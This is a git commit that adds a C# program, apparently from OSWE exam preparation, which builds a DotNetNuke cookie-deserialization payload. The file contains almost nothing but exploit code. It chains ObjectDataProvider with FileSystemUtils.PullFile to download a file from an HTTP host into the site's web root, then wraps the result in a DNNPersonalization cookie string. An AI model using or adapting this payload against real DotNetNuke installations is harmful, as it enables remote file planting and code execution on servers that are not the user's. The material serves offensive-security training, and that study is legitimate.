b618a1fe8aced8677d00a3af7c9643b06726d5c7
NULL <68764921+debiantano@users.noreply.github.com>
2022-03-20 17:09:49 -0500

    Create ODPSerializer2.cs

---
+++ OSWE/7_DotNetNuke_Cookie_Deserialization_RCE/ODPSerializer2.cs
@@ -0,0 +1,31 @@
+using System;
+using System.IO;
+using System.Xml.Serialization;
+using DotNetNuke.Common.Utilities;
+using System.Windows.Data;
+using System.Collections;
+
+namespace ODPSerializer
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            ObjectDataProvider myODP = new ObjectDataProvider();
+            myODP.ObjectInstance = new FileSystemUtils();
+            myODP.MethodName = "PullFile";
+            myODP.MethodParameters.Add("http://localhost:8000/test.txt");
+
+            myODP.MethodParameters.Add("C:/inetpub/wwwroot/dnn9/PullFileTest.txt");
+            Hashtable table = new Hashtable();
+            table["myTableEntry"] = myODP;
+            String payload = "; DNNPersonalization=" +
+            XmlUtils.SerializeDictionary(table, "profile");
+            TextWriter writer = new
+            StreamWriter("C:\\Users\\RICHAR\\Desktop\\PullFileTest.txt");
+            writer.Write(payload);
+            writer.Close();
+            Console.WriteLine("Done!");
+        }
+    }
+}
